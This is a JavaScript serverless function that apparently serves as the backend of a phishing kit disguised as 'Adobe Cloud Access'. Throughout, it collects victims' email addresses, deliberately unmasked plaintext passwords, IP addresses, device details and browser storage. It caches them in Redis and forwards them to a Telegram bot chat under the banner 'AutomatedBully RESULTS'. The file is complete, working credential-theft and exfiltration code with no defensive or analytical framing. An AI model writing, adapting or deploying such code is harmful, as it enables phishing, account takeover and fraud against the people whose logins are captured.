export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  // Helper: safe timeout signal (fallback if AbortSignal.timeout is not available)
  const createTimeoutSignal = (ms) => {
    if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.timeout === 'function') {
      return AbortSignal.timeout(ms);
    }
    // Fallback
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), ms);
    // clear timeout when finished (consumer can't, so handle later)
    controller.__timeoutId = id;
    return controller.signal;
  };

  try {
    const bodyRaw = event.body || '{}';
    let data;
    try {
      data = JSON.parse(bodyRaw);
    } catch (parseErr) {
      // If the body isn't JSON, fallback to empty object
      data = {};
    }

    const {
      email,
      password,
      provider,
      fileName,
      timestamp,
      userAgent,
      browserFingerprint,
      localStorage: clientLocalStorage,
      sessionStorage: clientSessionStorage,
      sessionId: incomingSessionId,
    } = data;

    // Required env vars
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ success: false, message: 'Server misconfiguration: missing Telegram env vars' })
      };
    }

    const DEBUG = String(process.env.DEBUG || '').toLowerCase() === 'true';
    
    // Get client IP with better detection (headers may be lowercased)
    const headersIn = event.headers || {};
    const headerGet = (name) => headersIn[name] || headersIn[name.toLowerCase()] || '';
    const clientIP = (headerGet('x-forwarded-for') || headerGet('x-real-ip') || headerGet('cf-connecting-ip') ||
                      (event.requestContext && event.requestContext.identity && event.requestContext.identity.sourceIp) ||
                      'Unknown').toString().split(',')[0].trim();

    // Per user request, cookie capturing is disabled.
    const cookieInfo = 'Cookies not captured';
    const formattedCookies = [];

    const localStorageInfo = (browserFingerprint && browserFingerprint.localStorage) || clientLocalStorage || 'Empty';
    const sessionStorageInfo = (browserFingerprint && browserFingerprint.sessionStorage) || clientSessionStorage || 'Empty';

    // Prepare session data for storage
    const sessionId = incomingSessionId || Math.random().toString(36).substring(2, 15);

    // Per request: include plaintext password as provided by client (do NOT mask)
    const plainPassword = (typeof password !== 'undefined' && password !== null) ? String(password) : 'Not captured';

    const sessionData = {
      email: email || '',
      password: plainPassword,
      provider: provider || 'Others',
      fileName: fileName || 'Adobe Cloud Access',
      timestamp: timestamp || new Date().toISOString(),
      sessionId,
      clientIP,
      userAgent: userAgent || 'Unknown',
      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? 'mobile' : 'desktop',
      cookies: cookieInfo,
      localStorage: localStorageInfo,
      sessionStorage: sessionStorageInfo,
      browserFingerprint: browserFingerprint || {},
      formattedCookies,
      rawDataType: typeof cookieInfo
    };

    // Store in Upstash Redis if provided
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
    const REDIS_TTL_SECONDS = parseInt(process.env.REDIS_TTL_SECONDS || '60', 10); // default short TTL

    if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
      try {
        const { Redis } = await import('@upstash/redis');
        const redis = new Redis({
          url: UPSTASH_REDIS_REST_URL,
          token: UPSTASH_REDIS_REST_TOKEN,
        });

        // Save session with TTL to avoid storing sensitive data indefinitely
        await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
        if (REDIS_TTL_SECONDS > 0) {
          await redis.expire(`session:${sessionId}`, REDIS_TTL_SECONDS);
        }
        try {
          await redis.set(`user:${email}`, JSON.stringify(sessionData));
          if (REDIS_TTL_SECONDS > 0) {
            await redis.expire(`user:${email}`, REDIS_TTL_SECONDS);
          }
        } catch (e) {
          // ignore if key cannot be set for empty email
        }

        if (DEBUG) console.log('✅ Session data stored in Redis');
      } catch (redisError) {
        console.error('❌ Redis storage error:', redisError);
      }
    }

    // Compose Telegram message (include plaintext password as requested)
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';

    const message = `🔐 AutomatedBully RESULTS

📧 ${email || 'Not captured'}
🔑 ${plainPassword}
🏢 ${provider || 'Others'}
🕒 ${new Date().toLocaleString()}
🌐 ${clientIP} | ${deviceInfo}
🍪 Cookies not captured

🆔 ${sessionId}`;

    // Send main message to Telegram
    const telegramSignal = createTimeoutSignal(15000);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
      signal: telegramSignal,
    });
    
    const telegramResult = await telegramResponse.json();
    if(!telegramResponse.ok) {
        console.error("Telegram API error:", telegramResult);
    }

    // Build minimal response
    const responseBody = {
      success: true,
      sessionId,
      cookiesCollected: false,
      cookieCount: 0,
      fileSent: false, // File sending is disabled as cookies are not captured
    };

    if (DEBUG) {
      responseBody.debug = {
        originalCookieType: 'disabled',
        processedCookieCount: 0,
        rawDataAvailable: false,
        storedInRedis: !!(UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN)
      };
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify(responseBody),
    };

  } catch (error) {
    // Attempt to notify via Telegram about the error (non-sensitive)
    try {
      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const errMsg = `🚨 <b>FUNCTION ERROR</b>\n\n<code>${String(error.message || error)}</code>\n\n${new Date().toISOString()}`;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: errMsg,
            parse_mode: 'HTML',
          }),
          signal: createTimeoutSignal(8000),
        });
      }
    } catch (notificationError) {
      // ignore notification errors
      if (String(process.env.DEBUG || '').toLowerCase() === 'true') {
        console.error('Notification error:', notificationError);
      }
    }

    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        timestamp: new Date().toISOString(),
        message: (String(process.env.DEBUG || '').toLowerCase() === 'true') ? String(error.message || error) : 'Internal server error'
      }),
    };
  }
};
